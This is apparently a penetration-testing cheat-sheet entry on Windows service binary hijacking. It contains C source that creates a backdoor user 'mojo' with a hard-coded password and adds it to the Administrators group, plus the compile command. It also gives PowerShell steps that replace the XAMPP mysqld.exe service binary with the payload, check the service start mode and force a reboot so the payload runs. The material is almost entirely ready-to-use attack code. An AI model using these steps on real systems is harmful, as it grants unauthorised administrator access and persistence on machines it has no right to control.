# Binary Hijacking

Create and add the user `mojo` to the local group `Administrators`

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user mojo password123! /add");
  i = system ("net localgroup administrators mojo /add");
  
  return 0;
}
```

Compilation

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
mv C:\xampp\mysql\bin\mysqld.exe mysqld.exe
mv .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

net stop mysql
# If denied access (unable to restart service), check if autorestart is enabled
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

# If StartMode is set to Auto
shutdown /r /t 0
```
